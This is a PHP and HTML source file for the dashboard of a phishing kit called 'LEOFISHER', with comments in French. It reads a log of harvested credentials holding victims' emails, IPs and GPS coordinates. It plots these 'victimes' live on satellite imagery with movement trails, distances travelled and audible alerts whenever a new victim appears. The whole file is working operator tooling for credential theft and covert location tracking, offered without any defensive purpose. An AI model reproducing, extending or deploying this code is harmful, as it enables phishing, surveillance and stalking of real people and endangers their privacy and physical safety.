<?php
date_default_timezone_set('Africa/Bujumbura');
$creds_file = 'creds.txt';

// 🔍 DETECT JSON API ou HTML DASHBOARD
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['api'])) {
    // ENDPOINT JSON LIVE TRACKING (NOUVEAU)
    header('Content-Type: application/json');
    $positions = [];
    
    if (file_exists($creds_file)) {
        $logs = file_get_contents($creds_file);
        $entries = explode("\n", $logs);
        $user_history = []; // {email: [[lat,lng,time,ip], ...]}
        
        foreach (array_reverse($entries) as $line) {
            if (preg_match('/^(\S+)\|([^|]+)\|([^|]+)\|.+?\|([-+]?\d+\.\d+)\|([-+]?\d+)\|(.*)$/', $line, $match)) {
                $ip = $match[1];
                $email = trim($match[2]);
                $lat = floatval($match[4]);
                $lng = floatval($match[5]);
                $timestamp = trim($match[6]);
                
                if ($email && strlen($email) > 3) {
                    if (!isset($user_history[$email])) $user_history[$email] = [];
                    $user_history[$email][] = [$lat, $lng, date('H:i:s', strtotime($timestamp)), $ip];
                    
                    // Garde 10 dernières positions
                    if (count($user_history[$email]) > 10) {
                        array_pop($user_history[$email]);
                    }
                }
            }
            if (count($user_history) > 100) break; // Perf
        }
        
        foreach ($user_history as $email => $history) {
            $latest = end($history);
            $positions[] = [
                'id' => $email,
                'positions' => $history,
                'latest' => $latest,
                'count' => count($history),
                'total_distance' => 0 // Calcul JS
            ];
        }
    }
    echo json_encode($positions, JSON_PRETTY_PRINT);
    exit;
}

// Parseur PRO ORIGINAL - PRESERVE 100%
$victims = [];
if (file_exists($creds_file)) {
    $logs = file_get_contents($creds_file);
    $entries = explode("┌─[ LEOFISHER v1.0 by Léo Falcon ]", $logs);

    foreach ($entries as $entry) {
        if (preg_match('/📍 GPS POSITION : ([-+]?\d+\.\d+),([-+]?\d+\.\d+)/', $entry, $gps_match)) {
            if (preg_match('/📧 .*? : (.*?)\n/', $entry, $email_match)) {
                $email = trim($email_match[1]);
                $lat = floatval($gps_match[1]);
                $lng = floatval($gps_match[2]);
                if ($lat != 0 && $lng != 0 && abs($lat) < 90 && abs($lng) < 180) {
                    $victims[] = [
                        'lat' => $lat,
                        'lng' => $lng,
                        'email' => $email,
                        'ip' => '', // Extract if needed
                        'time' => date('H:i:s')
                    ];
                }
            }
        }
    }
}

// Coordonnées OPÉRATEUR Bujumbura (fallback)
$op_lat = -3.361378;
$op_lng = 29.359912;
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>LEOFISHER GPS DASHBOARD PRO 2025 - LIVE TRACKING</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <!-- Leaflet + Plugins PRO -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
    <style>
        body { margin: 0; font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; }
        #map { height: 100vh; width: 100%; }
        .dashboard { 
            position: absolute; top: 10px; left: 10px; 
            background: rgba(0,0,0,0.95); padding: 20px; border: 2px solid #00ff00; 
            border-radius: 8px; z-index: 1000; backdrop-filter: blur(10px); 
            box-shadow: 0 0 30px rgba(0,255,0,0.3);
        }
        .stats { font-size: 14px; margin: 6px 0; }
        .victim-count { color: #ff4444; font-weight: bold; font-size: 20px; }
        .op-status { color: #ffff00; }
        .live-indicator { color: #00ff00; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.5; } }
        .zoom-controls { 
            position: absolute; top: 10px; right: 10px; 
            background: rgba(0,0,0,0.9); padding: 12px; border: 2px solid #00ff00; 
            border-radius: 8px; z-index: 1000; 
        }
        .zoom-btn { 
            background: #00ff00; color: #000; border: none; padding: 10px 14px; 
            margin: 3px; cursor: pointer; font-weight: bold; border-radius: 4px; 
            transition: all 0.2s; 
        }
        .zoom-btn:hover { background: #00cc00; transform: scale(1.05); }
        .alert-popup { 
            animation: shake 0.5s; background: #ff4444; color: white; 
            padding: 15px; border-radius: 8px; font-weight: bold; font-size: 16px;
        }
        @keyframes shake { 
            0%, 100% { transform: translateX(0); } 
            25% { transform: translateX(-8px); } 
            75% { transform: translateX(8px); } 
        }
        .op-marker { font-size: 26px !important; animation: pulse-yellow 2s infinite; }
        @keyframes pulse-yellow { 
            0% { opacity: 1; transform: scale(1); } 
            50% { opacity: 0.8; transform: scale(1.15); } 
            100% { opacity: 1; transform: scale(1); } 
        }
        .victim-marker { animation: pulse-red 1.5s infinite; }
        @keyframes pulse-red { 
            0% { opacity: 1; box-shadow: 0 0 15px #ff4444; } 
            50% { opacity: 0.6; box-shadow: 0 0 25px #ff4444; } 
            100% { opacity: 1; box-shadow: 0 0 15px #ff4444; } 
        }
    </style>
</head>
<body>
    <div id="map"></div>

    <div class="dashboard">
        <div class="stats"><strong>🚨 LEOFISHER GPS LIVE TRACKING PRO 2025</strong></div>
        <div class="stats victim-count">🎯 Victimes live: <span id="victimCount">0</span></div>
        <div class="stats op-status">🟡 Opérateur: <span id="opPos">Initialisation GPS...</span> <span class="live-indicator">● LIVE</span></div>
        <div class="stats">🛰️ Esri WorldImagery HD 2025 (Zoom 22)</div>
        <div class="stats">🔄 Update live: <span id="updateTimer">5s</span></div>
    </div>

    <div class="zoom-controls">
        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() + 2)">🔍 Zoom +</button>
        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() - 2)">🔎 Zoom -</button>
        <button class="zoom-btn" onclick="fitAllBounds()">📐 Fit All</button>
        <button class="zoom-btn" onclick="map.setZoom(22)">🏠 Max Zoom</button>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>

    <script>
        // ÉTAT GLOBAL LIVE TRACKING PRO
        let map, clusterGroup, opMarker, victims = {}, trajectories = {}, bounds = L.latLngBounds();
        let victimCount = 0, lastVictims = new Set(), updateTimer = 0;
        const updateInterval = 5000; // 5s
        let audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAo');

        // CARTE ESRI HD 2025 (inchangée)
        const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
            attribution: '© Esri WorldImagery 2025 HD', maxZoom: 22, minZoom: 1
        });
        const roads = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap', opacity: 0.7, maxZoom: 22
        });

        map = L.map('map', { layers: [satellite, roads], zoomControl: false, maxZoom: 22 })
            .setView([<?php echo $op_lat; ?>, <?php echo $op_lng; ?>], 12);

        clusterGroup = L.markerClusterGroup({
            spiderfyOnMaxZoom: true, showCoverageOnHover: true, zoomToBoundsOnClick: true,
            iconCreateFunction: cluster => L.divIcon({
                html: `<div style="background:#ff4444;color:white;border-radius:50%;width:35px;height:35px;line-height:35px;text-align:center;font-weight:bold;font-size:14px;">${cluster.getChildCount()}</div>`,
                iconSize: [35, 35], className: 'marker-cluster'
            })
        });
        map.addLayer(clusterGroup);

        // OP LIVE GPS watchPosition() fluide
        function updateOpLive(pos) {
            const [lat, lng] = [pos.coords.latitude, pos.coords.longitude];
            document.getElementById('opPos').textContent = `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
            
            if (opMarker) {
                opMarker.setLatLng([lat, lng]); // FLUIDE SANS RECRÉER
            } else {
                opMarker = L.marker([lat, lng], {
                    icon: L.divIcon({
                        className: 'op-marker', html: '🟡 <strong>OP</strong>',
                        iconSize: [40, 40], iconAnchor: [20, 40]
                    })
                }).addTo(map).bindPopup(`
                    <div style="font-family:monospace;color:#ffff00;width:280px;">
                        <h3>🚨 OPÉRATEUR LIVE TRACKING</h3>
                        <strong>📍 GPS:</strong> ${lat.toFixed(6)}, ${lng.toFixed(6)}<br>
                        <strong>🎯 Précision:</strong> ${pos.coords.accuracy?.toFixed(0) || 'N/A'}m<br>
                        <strong>🕒 Update:</strong> ${new Date().toLocaleTimeString('fr-BJ')}<br>
                        <em>Live via watchPosition()</em>
                    </div>
                `);
            }
            bounds.extend([lat, lng]);
            if (Object.keys(victims).length === 0) fitAllBounds();
        }

        navigator.geolocation.watchPosition(updateOpLive, () => {
            // Fallback Bujumbura
            updateOpLive({coords: {latitude: <?php echo $op_lat; ?>, longitude: <?php echo $op_lng; ?>}});
        }, { enableHighAccuracy: true, timeout: 3000, maximumAge: 1000 });

        // Haversine + distance totale trajet
        function haversine(p1, p2) {
            const R = 6371, dLat = (p2[0]-p1[0])*Math.PI/180, dLon = (p2[1]-p1[1])*Math.PI/180;
            const a = Math.sin(dLat/2)*Math.sin(dLat/2) + Math.cos(p1[0]*Math.PI/180)*Math.cos(p2[0]*Math.PI/180)*Math.sin(dLon/2)*Math.sin(dLon/2);
            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
        }

        function totalDistance(positions) {
            let dist = 0;
            for (let i = 1; i < positions.length; i++) dist += haversine(positions[i-1], positions[i]);
            return dist.toFixed(1);
        }

        // Popup victime PRO (clic = trajet + distance)
        function getVictimPopup(id, positions, ip) {
            const latest = positions[positions.length-1];
            const dist = totalDistance(positions);
            return `
                <div style="font-family:monospace;min-width:300px;color:#ff4444;">
                    <h3 style="margin:0 0 12px 0;color:#ff6666;">🔴 VICTIME LIVE: ${id.substring(0,20)}${id.length>20?'...':''}</h3>
                    <strong>📍 Position actuelle:</strong><br>
                    <code>${latest[0].toFixed(6)}, ${latest[1].toFixed(6)}</code><br><br>
                    <strong>🛤️ Trajet complet:</strong><br>
                    • ${positions.length} positions enregistrées<br>
                    • <strong>${dist} km</strong> parcourus<br>
                    • Début: ${positions[0][2]} → Fin: ${latest[2]}<br><br>
                    <strong>🌐 IP:</strong> ${ip || 'N/A'}<br>
                    <strong>🕒 Live:</strong> ${new Date().toLocaleTimeString('fr-BJ')}<br>
                    <hr style="border-color:#ff4444;margin:10px 0;">
                    <small>🗺️ Carte auto-zoom sur trajet</small>
                </div>
            `;
        }

        // UPDATE LIVE VICTIMES (5s SANS RELOAD)
        async function updateVictimsLive() {
            try {
                const res = await fetch('?api=1');
                const data = await res.json();
                
                data.forEach(userData => {
                    const id = userData.id;
                    const positions = userData.positions;
                    const latest = userData.latest;
                    const ip = latest[3] || '';
                    
                    // NOUVELLE VICTIME ? → ALERTE PRO
                    if (!victims[id]) {
                        victimCount++;
                        document.getElementById('victimCount').textContent = victimCount;
                        showNewVictimAlert(`🎯 NOUVELLE VICTIME #${victimCount}: ${id}`);
                        audio.play().catch(()=>{}); // Beep discret
                        lastVictims.add(id);
                    }
                    
                    // CRÉER/UPDATE MARKER FLUIDE
                    if (!victims[id]) {
                        // Nouveau marker rouge
                        const num = Object.keys(victims).length + 1;
                        const marker = L.marker([latest[0], latest[1]], {
                            icon: L.divIcon({
                                className: 'victim-marker',
                                html: `🔴 #${num}`,
                                iconSize: [32, 32], iconAnchor: [16, 32]
                            })
                        }).addTo(clusterGroup);
                        
                        // Polyline trajet
                        const polyline = L.polyline([], {
                            color: '#ff4444', weight: 4, opacity: 0.85,
                            smoothFactor: 2, dashArray: '5,5'
                        }).addTo(map);
                        
                        victims[id] = { marker, polyline, positions: [] };
                        marker.bindPopup(getVictimPopup(id, positions, ip));
                        
                        // Click = zoom trajet
                        marker.on('click', () => {
                            map.fitBounds(polyline.getBounds(), {padding: [20,20], maxZoom: 18});
                        });
                    }
                    
                    // UPDATE FLUIDE
                    victims[id].marker.setLatLng([latest[0], latest[1]]);
                    victims[id].polyline.setLatLngs(positions.map(p => [p[0], p[1]]));
                    victims[id].marker.bindPopup(getVictimPopup(id, positions, ip));
                    victims[id].positions = positions;
                    
                    bounds.extend(latest);
                });
                
                updateTimer++;
                document.getElementById('updateTimer').textContent = `${(updateInterval/1000)}s (#${updateTimer})`;
                
            } catch(e) {
                console.error('Live update error:', e);
            }
        }

        function showNewVictimAlert(msg) {
            const alert = L.popup({closeButton: false})
                .setLatLng([<?php echo $op_lat; ?>, <?php echo $op_lng; ?>])
                .setContent(`<div class="alert-popup">${msg}</div>`)
                .openOn(map);
            setTimeout(() => map.closePopup(alert), 5000);
        }

        function fitAllBounds() {
            if (bounds.isValid()) {
                map.fitBounds(bounds, { padding: [30, 30], maxZoom: 18 });
            }
        }

        // LOAD INITIAL + LIVE UPDATES 5s (Remplace location.reload())
        const initialVictims = <?php echo json_encode($victims); ?>;
        document.getElementById('victimCount').textContent = initialVictims.length;
        initialVictims.forEach((v,i) => {
            bounds.extend([v.lat, v.lng]);
        });
        if (bounds.isValid()) fitAllBounds();

        // LIVE TRACKING ENGINE
        setInterval(updateVictimsLive, updateInterval);
        updateVictimsLive(); // Premier update immédiat
    </script>
</body>
</html>
